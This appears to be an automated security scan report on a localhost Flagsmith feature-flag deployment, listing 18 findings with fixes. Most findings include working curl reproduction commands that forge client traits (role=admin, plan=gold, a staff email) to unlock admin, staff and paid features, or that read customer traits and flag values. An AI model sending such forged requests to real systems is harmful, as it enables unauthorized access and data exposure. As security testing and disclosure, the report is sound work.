# Gatecrasher security report

**18 ways in** · report `r-20261127-202138-f6cb34` · 2026-11-27 20:21 UTC

critical 3 · high 5 · medium 7 · low 3 · info 0

- Target: http://localhost:3030
- Environment: Production
- AI mode: on (claude-sonnet-5-5 via Claude Code)

## Findings

### [CRITICAL] Payment secret exposed in a public feature flag

`GC-8B6A1273` · `SECRET_IN_CLIENT_VALUE` · subject `payment_config` · ✗ EXPLOITABLE · detected by deterministic

**What happened.** Anyone holding the client key, which ships inside the app, can request the production flag list and read the payment_config flag. It contains what looks like a live payment provider API secret.

**Why it matters.** Client keys are not private. A secret stored in a flag value is effectively published to every user and anyone inspecting the app.

**Business impact.** Attackers could use the key to act as your payment account, causing fraud, financial loss, customer data exposure, and emergency credential rotation.

**Reproduce**

```sh
curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>'
```

<details><summary>Evidence: request</summary>

Request

```
curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>'
```

Response

```
payment_config = {"provider":"acmepay","api_secret":"[SECRET len=42 prefix=acme…]","webhook":"ht… (126 bytes)
```

secret detected in value at $.api_secret (acme_live_key)

</details>

**Fix:** Remove the secret from the flag, store it in server-side secret storage, and rotate the exposed key immediately.

### [CRITICAL] Anyone can switch on the admin panel by claiming to be an admin

`GC-70850605` · `TRAIT_FORGERY` · subject `admins` · ✗ EXPLOITABLE · detected by flagsmith-engine, live-probe

**What happened.** In Production, the app trusts a self-reported 'role' value sent by the client. Testing with an outside-style request claiming role=admin turned the 'admin_panel' flag from off to on. No password or special access was needed.

**Why it matters.** The admin panel is a security control, but its gate relies on information the user supplies themselves, so it can be faked.

**Business impact.** Unauthorized people could see or reach admin features, risking data exposure, unwanted changes, and compliance or customer-trust damage.

**Reproduce**

```sh
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-8815d4df-476f-4e2e-bea0-310df6273d05","traits":[{"trait_key":"role","trait_value":"admin","transient":true}],"transient":true}'
```

<details><summary>Evidence: engine</summary>

Flagsmith's engine serves on instead of off for flag "admin_panel" to an identity with trait/identifier role="admin" (segment "admins"; forgeable: yes).

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-8815d4df-476f-4e2e-bea0-310df6273d05","traits":[{"trait_key":"role","trait_value":"admin","transient":true}],"transient":true}'
```

Response

```
HTTP 200 {"identifier":"gc-probe-8815d4df-476f-4e2e-bea0-310df6273d05","traits":[{"id":null,"trait_key":"role","trait_value":"admin","transient":true}],"flags":[{"id":2,"feature":{"id":1,"name":"premium_export","created_date":"2026-11-27T18:01:21.396897Z","description":"Paid feature gated on the plan trait (trait forgery).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":30,"feature":{"id":2,"name":"admin_panel","created_date":"2026-11-27T18:01:21.583758Z","description":"Admin UI gated on the role trait (privilege escalation).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":7,"enabled":true,"reason":"TARGETING_MATCH; segment=admins","variant":null},{"id":6,"feature":{"id":3,"name":"staff_preview","created_date":"2026-11-27T18:01:21.752189Z","description":"Staff-only preview gated on an email regex.","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":8,"feature":{"id":4,"name":"early_access_ai","created_date":"2026-11-27T18:01:21.938841Z","description":"10 percent canary rollout (identifier re-roll).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"…
```

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-d7415c55da0d88d16eb572430f6c491c","traits":[{"trait_key":"role","trait_value":"admin","transient":true}],"transient":true}'
```

Transient SDK evaluation; raw response omitted to protect trait and flag values.

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-ada088958c2c41a8fb3217e168e54360","traits":[{"trait_key":"role","trait_value":"admin","transient":true}],"transient":true}'
```

Transient SDK evaluation; raw response omitted to protect trait and flag values.

</details>

**Fix:** Stop deciding admin access from client-supplied values. Determine roles on the server from authenticated identity, and enforce admin permissions there rather than relying on a feature flag.

### [CRITICAL] Anyone can unlock staff-only features by typing a staff email

`GC-1A45D85C` · `TRAIT_FORGERY` · subject `staff` · ✗ EXPLOITABLE · detected by flagsmith-engine, live-probe

**What happened.** Using only the public client key, a test request claimed the email a@acmeshop.dev. The system trusted it and switched the staff_preview flag from off to on in Production. No login or proof was needed.

**Why it matters.** The staff segment is decided by a self-reported email that the caller can freely change, so it is not real access control.

**Business impact.** Outsiders could see unreleased or internal features meant only for employees, risking leaks of upcoming plans and exposure of unfinished functionality to customers or competitors.

**Reproduce**

```sh
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-0e1f125e-2a20-4686-9c4e-b022001e7360","traits":[{"trait_key":"email","trait_value":"a@acmeshop.dev","transient":true}],"transient":true}'
```

<details><summary>Evidence: engine</summary>

Flagsmith's engine serves on instead of off for flag "staff_preview" to an identity with trait/identifier email="a@acmeshop.dev" (segment "staff"; forgeable: yes).

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-0e1f125e-2a20-4686-9c4e-b022001e7360","traits":[{"trait_key":"email","trait_value":"a@acmeshop.dev","transient":true}],"transient":true}'
```

Response

```
HTTP 200 {"identifier":"gc-probe-0e1f125e-2a20-4686-9c4e-b022001e7360","traits":[{"id":null,"trait_key":"email","trait_value":"a@acmeshop.dev","transient":true}],"flags":[{"id":2,"feature":{"id":1,"name":"premium_export","created_date":"2026-11-27T18:01:21.396897Z","description":"Paid feature gated on the plan trait (trait forgery).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":4,"feature":{"id":2,"name":"admin_panel","created_date":"2026-11-27T18:01:21.583758Z","description":"Admin UI gated on the role trait (privilege escalation).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":31,"feature":{"id":3,"name":"staff_preview","created_date":"2026-11-27T18:01:21.752189Z","description":"Staff-only preview gated on an email regex.","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":8,"enabled":true,"reason":"TARGETING_MATCH; segment=staff","variant":null},{"id":8,"feature":{"id":4,"name":"early_access_ai","created_date":"2026-11-27T18:01:21.938841Z","description":"10 percent canary rollout (identifier re-roll).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_valu…
```

</details>

**Fix:** Stop using client-supplied traits to grant staff access. Decide staff membership on your server, or use signed identities, and rotate any exposed assumptions.

### [HIGH] Users can pick their own group in experiment "Pricing page price test" (pricing_page)

`GC-DED120AC` · `EXPERIMENT_RIGGING` · subject `pricing_page` · ✗ EXPLOITABLE · detected by flagsmith-engine, live-probe

**What happened.** An outsider can steer which variant of pricing_page they receive and feed results into the experiment.

**Why it matters.** Experiment results can be manipulated by anyone who knows the public key.

**Business impact.** Decisions based on the experiment may be wrong.

**Reproduce**

```sh
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-map-0","traits":[],"transient":true}'
```

<details><summary>Evidence: engine</summary>

Variant spread over 1000 identifiers: map[price_high:516 price_low:484]

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-map-0","traits":[],"transient":true}'
```

Response

```
HTTP 200 {"identifier":"gc-probe-map-0","traits":[],"flags":[{"id":2,"feature":{"id":1,"name":"premium_export","created_date":"2026-11-27T18:01:21.396897Z","description":"Paid feature gated on the plan trait (trait forgery).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":4,"feature":{"id":2,"name":"admin_panel","created_date":"2026-11-27T18:01:21.583758Z","description":"Admin UI gated on the role trait (privilege escalation).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":6,"feature":{"id":3,"name":"staff_preview","created_date":"2026-11-27T18:01:21.752189Z","description":"Staff-only preview gated on an email regex.","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":8,"feature":{"id":4,"name":"early_access_ai","created_date":"2026-11-27T18:01:21.938841Z","description":"10 percent canary rollout (identifier re-roll).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":33,"featur…
```

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-5664fe462cc7268bb9a0b89f73bddc8c","traits":[],"transient":true}'
```

Transient SDK evaluation; raw response omitted to protect trait and flag values.

</details>

**Fix:** Keep experiment identifiers server-side and review the results for contamination.

### [HIGH] Payment settings flag is sent to client apps

`GC-0B5C5F67` · `FLAG_NOT_SERVER_ONLY` · subject `payment_config` · ✗ EXPLOITABLE · detected by admin-settings

**What happened.** The production flag "payment_config" is marked secret, but its "Server-side only" setting is off. This means client SDKs, such as those in browsers or mobile apps, receive it.

**Why it matters.** Anyone who can run or inspect a client app may be able to read this flag's value. Secret configuration is meant to stay on your servers.

**Business impact.** Payment-related settings could be exposed to outsiders, which may aid fraud, expose partner details, or create compliance concerns. The evidence does not show what the flag contains or that anyone has accessed it.

<details><summary>Evidence: setting</summary>

Feature "payment_config" is classified SECRET but the dashboard setting "Server-side only" is off, so client SDKs receive it.

</details>

**Fix:** Turn on "Server-side only" for payment_config in Production. Then review what the flag holds and rotate any sensitive values if needed.

### [HIGH] Customer profile data readable with a public key

`GC-914405C1` · `IDENTITY_TRAIT_LEAK` · subject `ce***@acmeshop.dev` · ✗ EXPLOITABLE · detected by live-probe, admin-settings

**What happened.** Anyone holding the public client key, which ships inside the app, can look up a customer by email and get back the 3 traits stored on their profile. The test confirmed the traits are returned; their contents were not read.

**Why it matters.** The "Hide sensitive data" setting is off in Production, so personal information is served to anyone who asks.

**Business impact.** Customer personal data could be harvested, creating privacy-law exposure, breach notification duties, and loss of customer trust.

**Reproduce**

```sh
curl -s 'http://localhost:8000/api/v1/identities/?identifier=<TEST_IDENTITY>' -H 'X-Environment-Key: <CLIENT_KEY>'
```

<details><summary>Evidence: request</summary>

Request

```
curl -s 'http://localhost:8000/api/v1/identities/?identifier=<TEST_IDENTITY>' -H 'X-Environment-Key: <CLIENT_KEY>'
```

Response

```
3 traits exposed; all values [MASKED]
```

</details>

<details><summary>Evidence: setting</summary>

Identity stores 3 trait(s); "Hide sensitive data" is off, so GET identities/?identifier= returns them. Trait values are not read by Gatecrasher.

</details>

**Fix:** Turn on "Hide sensitive data" for the Production environment and keep personal details out of traits that the client key can read.

### [HIGH] User profile data readable with a public key

`GC-1305BD20` · `IDENTITY_TRAIT_LEAK` · subject `qa***@acmeshop.dev` · ✗ EXPLOITABLE · detected by live-probe

**What happened.** Anyone holding the public client key, which ships inside the app, can request a user's stored traits from the production identities endpoint. The test confirmed it for one account and returned one trait. Values were masked in our evidence.

**Why it matters.** The public key is meant for fetching flags, not reading personal data. Anyone can extract it and look up users.

**Business impact.** Customer personal information could be exposed, risking privacy-law violations, regulatory scrutiny, and loss of customer trust.

**Reproduce**

```sh
curl -s 'http://localhost:8000/api/v1/identities/?identifier=<TEST_IDENTITY>' -H 'X-Environment-Key: <CLIENT_KEY>'
```

<details><summary>Evidence: request</summary>

Request

```
curl -s 'http://localhost:8000/api/v1/identities/?identifier=<TEST_IDENTITY>' -H 'X-Environment-Key: <CLIENT_KEY>'
```

Response

```
1 traits exposed; all values [MASKED]
```

</details>

**Fix:** Stop returning identity traits to public client keys, or require a server-side secret. Remove personal data from traits and rotate keys.

### [HIGH] Anyone can unlock the premium export by claiming to be a gold customer

`GC-688647D2` · `TRAIT_FORGERY` · subject `gold_plan` · ✗ EXPLOITABLE · detected by flagsmith-engine, live-probe

**What happened.** Using only the public client key, an outsider sent a request saying their plan was "gold". The system accepted it and switched the premium_export feature from off to on. No login or payment was needed.

**Why it matters.** The feature's access depends on a customer-supplied detail that anyone can fake, so the paywall isn't actually enforced.

**Business impact.** People can use a paid feature for free, which means lost subscription revenue and less reason to upgrade to gold.

**Reproduce**

```sh
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-af593764-ea2c-4b29-985d-e361c969752c","traits":[{"trait_key":"plan","trait_value":"gold","transient":true}],"transient":true}'
```

<details><summary>Evidence: engine</summary>

Flagsmith's engine serves on instead of off for flag "premium_export" to an identity with trait/identifier plan="gold" (segment "gold_plan"; forgeable: yes).

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-af593764-ea2c-4b29-985d-e361c969752c","traits":[{"trait_key":"plan","trait_value":"gold","transient":true}],"transient":true}'
```

Response

```
HTTP 200 {"identifier":"gc-probe-af593764-ea2c-4b29-985d-e361c969752c","traits":[{"id":null,"trait_key":"plan","trait_value":"gold","transient":true}],"flags":[{"id":29,"feature":{"id":1,"name":"premium_export","created_date":"2026-11-27T18:01:21.396897Z","description":"Paid feature gated on the plan trait (trait forgery).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":6,"enabled":true,"reason":"TARGETING_MATCH; segment=gold_plan","variant":null},{"id":4,"feature":{"id":2,"name":"admin_panel","created_date":"2026-11-27T18:01:21.583758Z","description":"Admin UI gated on the role trait (privilege escalation).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":6,"feature":{"id":3,"name":"staff_preview","created_date":"2026-11-27T18:01:21.752189Z","description":"Staff-only preview gated on an email regex.","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":8,"feature":{"id":4,"name":"early_access_ai","created_date":"2026-11-27T18:01:21.938841Z","description":"10 percent canary rollout (identifier re-roll).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null…
```

</details>

**Fix:** Decide access on the server using trusted billing data, not traits sent by the client. Or sign the identity so claimed plans can't be forged.

### [MEDIUM] Per-user feature override can be read by outsiders

`GC-58B8A822` · `IDENTITY_OVERRIDE_LEAK` · subject `beta_dashboard` · ✗ EXPLOITABLE · detected by flagsmith-engine, admin-settings, live-probe

**What happened.** Anyone who knows a user's identifier and the public client key can request that user's settings and see that their beta_dashboard flag differs from the default. The check showed it turning from off to on in Production. The actual values were masked.

**Why it matters.** The 'Hide sensitive data' setting is off, so per-user override data is exposed in the environment document and identity lookups.

**Business impact.** Outsiders can see who gets early or special features, which may leak beta plans or customer targeting. This finding is rated harmless, so the exposure is limited.

**Reproduce**

```sh
curl -s 'http://localhost:8000/api/v1/identities/?identifier=<TEST_IDENTITY>' -H 'X-Environment-Key: <CLIENT_KEY>'
```

<details><summary>Evidence: engine</summary>

Identity override present in the environment document while "Hide sensitive data" is off.

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s 'http://localhost:8000/api/v1/identities/?identifier=<TEST_IDENTITY>' -H 'X-Environment-Key: <CLIENT_KEY>'
```

Response

```
Identity override differs from baseline; values [MASKED]
```

</details>

**Fix:** Turn on 'Hide sensitive data' for the Production environment so identity overrides are no longer returned to client-side requests.

### [MEDIUM] Internal admin address exposed to all website visitors

`GC-63E8DE85` · `INTERNAL_URL_LEAK` · subject `internal_api_url` · ✗ EXPLOITABLE · detected by deterministic

**What happened.** Anyone holding the public client key can request the flag list and see a setting named internal_api_url. It reveals a private network address pointing to an admin endpoint.

**Why it matters.** The address shows how your internal systems are laid out. Attackers can use it to aim follow-up attacks at the admin interface.

**Business impact.** This raises the odds of a deeper breach of internal systems, with possible downtime, data exposure, and customer trust damage.

**Reproduce**

```sh
curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>'
```

<details><summary>Evidence: request</summary>

Request

```
curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>'
```

Response

```
internal_api_url = http://10.0.3.7:8080/admin (26 bytes)
```

internal url detected in value at $ (private_ip)

</details>

**Fix:** Remove internal_api_url from flags served to browsers and keep it in server-side configuration. Then check that no other flags hold internal addresses.

### [MEDIUM] Unreleased AI feature can be unlocked by guessing identifiers

`GC-B626FA94` · `PERCENTAGE_REROLL` · subject `early_access_ai` · ✗ EXPLOITABLE · detected by flagsmith-engine, live-probe

**What happened.** The early_access_ai feature is meant for a 10% test group. Anyone can send a made-up user identifier to the public API and see whether the feature turns on. About 1 in 11 tries succeeds, so an outsider can quickly find an identifier that unlocks it.

**Why it matters.** The group is chosen by an identifier the caller controls, so the rollout limit does not protect the feature.

**Business impact.** People outside the test group can use or see an unreleased product, which undermines controlled rollout and early-access promises.

**Reproduce**

```sh
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-map-9","traits":[],"transient":true}'
```

<details><summary>Evidence: engine</summary>

Flagsmith's engine serves on instead of off for flag "early_access_ai" to an identity with trait/identifier identifier="gc-probe-map-9" (segment "canary_10"; forgeable: yes).

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-map-9","traits":[],"transient":true}'
```

Response

```
HTTP 200 {"identifier":"gc-probe-map-9","traits":[],"flags":[{"id":2,"feature":{"id":1,"name":"premium_export","created_date":"2026-11-27T18:01:21.396897Z","description":"Paid feature gated on the plan trait (trait forgery).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":4,"feature":{"id":2,"name":"admin_panel","created_date":"2026-11-27T18:01:21.583758Z","description":"Admin UI gated on the role trait (privilege escalation).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":6,"feature":{"id":3,"name":"staff_preview","created_date":"2026-11-27T18:01:21.752189Z","description":"Staff-only preview gated on an email regex.","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":32,"feature":{"id":4,"name":"early_access_ai","created_date":"2026-11-27T18:01:21.938841Z","description":"10 percent canary rollout (identifier re-roll).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":9,"enabled":true,"reason":"TARGETING_MATCH; segment=canary_10","variant…
```

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-0d8c6f3cda20a81b5a654467388087ee","traits":[],"transient":true}'
```

Transient SDK evaluation; raw response omitted to protect trait and flag values.

</details>

**Fix:** Choose rollout membership using a server-verified user identity, not a client-supplied identifier. Keep truly restricted features off the client-facing API.

### [MEDIUM] Production lets users set their own traits

`GC-A60CCA1A` · `SETTING_CLIENT_TRAITS_ON` · subject `allow_client_traits` · ✗ EXPLOITABLE · detected by admin-settings

**What happened.** In Production, the setting that lets client SDKs set user traits is on. Anyone with the public client key can assign themselves any traits they like.

**Why it matters.** Any segment that decides access based on a trait can be faked. Outsiders could place themselves in groups meant for staff, beta testers, or paying customers.

**Business impact.** People could unlock unreleased or paid features without authorization, which risks lost revenue and early exposure of unfinished work. The evidence shows the setting is on, not that anyone has abused it.

<details><summary>Evidence: setting</summary>

Environment "Production": dashboard setting "Allow client SDKs to set user traits" is ON (allow_client_traits). Anyone holding the public client key can set their own traits, so any segment keyed on a trait can be forged. Turn this setting off for every environment that uses segments for access control.

</details>

**Fix:** Turn off "Allow client SDKs to set user traits" for every environment that uses segments for access control. Set traits from your trusted server instead.

### [MEDIUM] Production feature flag data is not hidden

`GC-9FE52BC7` · `SETTING_SENSITIVE_DATA_VISIBLE` · subject `hide_sensitive_data` · ✗ EXPLOITABLE · detected by admin-settings

**What happened.** The "Hide sensitive data" setting is turned off in the Production environment. This means sensitive values tied to feature flags are not masked in that environment's dashboard.

**Why it matters.** Anyone who can view the Production dashboard can see data that should be concealed. The evidence shows only the setting is off; it does not show that anyone has actually seen or misused data.

**Business impact.** Sensitive information could be exposed to people who do not need it, raising the risk of accidental leaks and creating compliance or customer-trust concerns.

<details><summary>Evidence: setting</summary>

Environment "Production": dashboard setting "Hide sensitive data" is OFF (hide_sensitive_data). Sensitive data is not hidden in this environment. Turn this setting on.

</details>

**Fix:** Turn on "Hide sensitive data" for the Production environment in the dashboard settings.

### [MEDIUM] Flag name reveals an unreleased AI feature

`GC-DEBD1D23` · `UNRELEASED_PRODUCT_LEAK` · subject `early_access_ai` · ✗ EXPLOITABLE · detected by ai

**What happened.** Anyone holding the public client key can list your feature flags in Production. The flag named "early_access_ai" appears in the list, even though its value is empty.

**Why it matters.** The flag's name alone suggests an early-access AI product that has not been announced. The evidence shows the name is exposed, not that the feature itself is accessible.

**Business impact.** Competitors or the press could learn about your AI plans early, weakening launch timing, messaging, and competitive advantage.

**Reproduce**

```sh
curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>'
```

<details><summary>Evidence: request</summary>

Request

```
curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>'
```

Response

```
early_access_ai =  (0 bytes)
```

Name reveals an early-access AI feature that is likely unreleased.

</details>

**Fix:** Rename the flag to something neutral, and stop returning flags that clients don't need. Serve only the flags each client actually requires.

### [MEDIUM] Flag name reveals an unreleased product

`GC-07590992` · `UNRELEASED_PRODUCT_LEAK` · subject `project_nightjar_launch_2026_12_15` · ✗ EXPLOITABLE · detected by deterministic

**What happened.** Anyone holding the public client key can list the feature flags in Production. One flag's name, project_nightjar_launch_2026_12_15, exposes an unreleased product's codename and planned launch date.

**Why it matters.** The flag's value is empty, but the name alone discloses confidential plans. Flag names are visible to anyone who calls the endpoint.

**Business impact.** Competitors, press, or leakers could learn about the launch early, undermining marketing plans and the surprise of the announcement.

**Reproduce**

```sh
curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>'
```

<details><summary>Evidence: request</summary>

Request

```
curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>'
```

Response

```
project_nightjar_launch_2026_12_15 =  (0 bytes)
```

unreleased product detected in flag name (codename_launch)

</details>

**Fix:** Rename the flag to a neutral, non-descriptive name and stop serving unreleased flags to client keys. Keep codenames and dates in internal documents only.

### [LOW] Unreleased AI feature flag is visible to client apps

`GC-EA6AFCDF` · `FLAG_NOT_SERVER_ONLY` · subject `early_access_ai` · ✗ EXPLOITABLE · detected by admin-settings

**What happened.** The flag "early_access_ai", which marks an unreleased product, is not set to "Server-side only" in Production. Because of that, client SDKs receive it, so anyone inspecting the app's flag data could see it exists.

**Why it matters.** Flag names and settings for unreleased products are meant to stay private. This one is exposed to every client that loads the flags.

**Business impact.** Competitors or press could learn about your upcoming AI product before launch, undermining announcement plans and competitive advantage. The evidence shows exposure of the flag, not any further access.

<details><summary>Evidence: setting</summary>

Feature "early_access_ai" is classified UNRELEASED_PRODUCT but the dashboard setting "Server-side only" is off, so client SDKs receive it.

</details>

**Fix:** Turn on the "Server-side only" setting for early_access_ai in the Production environment, and check that no client code depends on it.

### [LOW] Internal API address exposed to client apps

`GC-03878136` · `FLAG_NOT_SERVER_ONLY` · subject `internal_api_url` · ✗ EXPLOITABLE · detected by admin-settings

**What happened.** In Production, the flag "internal_api_url" is not marked "Server-side only", so client SDKs receive it. Anyone using the app or SDK could potentially read it.

**Why it matters.** The flag is classified as an internal URL. Revealing it shows outsiders how your internal systems are named and reached, which helps them plan attacks.

**Business impact.** Increases the risk of targeted probing of internal services. The evidence shows exposure of the setting only, not any actual misuse.

<details><summary>Evidence: setting</summary>

Feature "internal_api_url" is classified INTERNAL_URL but the dashboard setting "Server-side only" is off, so client SDKs receive it.

</details>

**Fix:** Turn on "Server-side only" for internal_api_url in Production so client SDKs no longer receive it.

### [LOW] Unreleased product flag is visible to client apps

`GC-64038665` · `FLAG_NOT_SERVER_ONLY` · subject `project_nightjar_launch_2026_12_15` · ✗ EXPLOITABLE · detected by admin-settings

**What happened.** The flag named for an unreleased product launch in Production is not set to "Server-side only", so client SDKs receive it. Anyone using the public app or website can potentially read the flag's name.

**Why it matters.** The flag name reveals a confidential project and a planned launch date, before any announcement.

**Business impact.** Competitors, press, or investors could learn about the launch early, weakening marketing plans and competitive advantage.

<details><summary>Evidence: setting</summary>

Feature "project_nightjar_launch_2026_12_15" is classified UNRELEASED_PRODUCT but the dashboard setting "Server-side only" is off, so client SDKs receive it.

</details>

**Fix:** Turn on the "Server-side only" setting for this flag in the Production dashboard. Consider renaming it to something non-descriptive.

## Environment security settings

| Environment | Client traits | Sensitive data hidden | Server-only flags | Client-visible flags |
|---|---|---|---|---|
| Production | ✗ Allowed | ✗ Visible | 0 | 11 |

## Reachability map

| Flag | Reachable value | Via | Engine-verified | Live-verified |
|---|---|---|---|---|
| premium_export | enabled | forged traits plan=gold, segment gold_plan | ✓ Yes | ✓ Yes |
| admin_panel | enabled | forged traits role=admin, segment admins | ✓ Yes | ✓ Yes |
| staff_preview | enabled | forged traits email=a@acmeshop.dev, segment staff | ✓ Yes | ✓ Yes |
| early_access_ai | enabled | identifier gc-probe-map-9, segment canary_10 | ✓ Yes | ✓ Yes |
| pricing_page | enabled, value price_low | identifier gc-probe-map-0 | ✓ Yes | ✓ Yes |

## Method and scope

Scope (the only hosts contacted):

- `localhost`
- `localhost:8000`

- Probes sent: 1421
- Duration: 198.3 s
  - explain: 73.3 s
  - map: 64.0 s
  - recon: 61.0 s
- Engine parity: 1000/1000
- Engine: v5.7.0
- Tool: Gatecrasher dev
- Note: skipped out-of-scope script cdn.jsdelivr.net/npm/flagsmith@10.0.0/index.js: host not in allowed_domains
